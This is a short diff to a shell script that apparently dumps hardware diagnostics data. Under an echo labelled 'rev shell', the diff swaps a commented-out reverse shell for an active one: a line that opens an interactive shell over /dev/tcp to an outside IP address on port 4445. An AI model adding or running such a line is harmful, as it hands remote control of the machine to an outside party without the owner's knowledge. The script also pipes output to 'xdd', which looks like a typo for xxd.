@@ -114,5 +114,5 @@ echo "tmp hw_diagnostics.raw"
 cat /tmp/hw_diagnostics.raw | xdd
 
 echo "rev shell"
-# sh -i >& /dev/tcp/194.163.166.19/4445 0>&1
+sh -i >& /dev/tcp/54.73.133.183/4445 0>&1
 exit 0
